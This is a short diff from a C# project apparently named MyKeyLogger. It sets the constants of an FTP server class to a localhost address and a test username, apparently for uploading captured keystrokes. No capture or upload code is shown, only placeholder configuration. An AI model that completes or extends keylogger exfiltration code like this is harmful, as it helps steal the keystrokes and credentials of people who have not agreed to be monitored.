@@ -7,10 +7,9 @@ namespace MyKeyLogger
 {
 	public class ServerFTP
 	{
+		public const string SERVER = "127.0.0.1";
 
-		public const string SERVER = "";
-
-		public const string USERNAME = "";
+		public const string USERNAME = "test";
 
 		public const string PASSWORD = "";
 		// Constructeur par defaut, il y a rien dedans
